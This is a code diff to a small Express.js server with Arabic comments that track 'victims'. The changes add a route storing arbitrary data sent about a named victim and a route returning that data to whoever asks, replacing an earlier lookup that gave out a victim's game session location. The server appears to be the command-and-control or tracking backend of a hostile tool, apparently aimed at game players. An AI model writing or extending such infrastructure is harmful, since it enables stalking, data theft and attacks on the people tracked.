@@ -4,6 +4,7 @@ app.use(express.json());
 
 let activePlayers = {}; // قاعدة بيانات اللاعبين في الذاكرة
 let chatData = { username: "System", message: "No Command", time: Date.now() };
+let victimInfo = {}; // لتخزين معاملات الضحايا
 
 // استقبال إشارة الضحية
 app.post('/ping', (req, res) => {
@@ -18,24 +19,35 @@ app.post('/ping', (req, res) => {
     res.send("Updated");
 });
 
-// جلب بيانات الضحية
-app.get('/target_info', (req, res) => {
+// استقبال معاملات الضحية
+app.post('/info', (req, res) => {
+    const { username, data } = req.body;
+    if (username && data) {
+        victimInfo[username] = {
+            ...data,
+            receivedAt: Date.now()
+        };
+        console.log(`📊 معلومات جديدة من: ${username}`);
+        res.json({ status: "received" });
+    } else {
+        res.status(400).json({ error: "بيانات ناقصة" });
+    }
+});
+
+// جلب معاملات الضحية
+app.get('/getinfo', (req, res) => {
     const username = req.query.username;
-    const info = activePlayers[username];
+    const info = victimInfo[username];
     
     if (info) {
         const now = Date.now();
-        if (now - info.lastSeen < 12000) {
-            res.json({
-                placeId: info.placeId,
-                jobId: info.jobId,
-                status: "Online"
-            });
+        if (now - info.receivedAt < 30000) { // معلومات حديثة خلال 30 ثانية
+            res.json(info);
         } else {
-            res.status(404).json({ status: "Offline" });
+            res.status(404).json({ status: "المعلومات منتهية الصلاحية" });
         }
     } else {
-        res.status(404).json({ status: "Not Registered" });
+        res.status(404).json({ status: "لا توجد معلومات" });
     }
 });
 
@@ -52,4 +64,4 @@ app.post('/update', (req, res) => {
 
 app.get('/data', (req, res) => res.json(chatData));
 
-app.listen(process.env.PORT || 3000, () => console.log('Server Live'));
+app.listen(process.env.PORT || 3000, () => console.log('🟢 السيرفر يعمل على المنفذ ' + (process.env.PORT || 3000)));
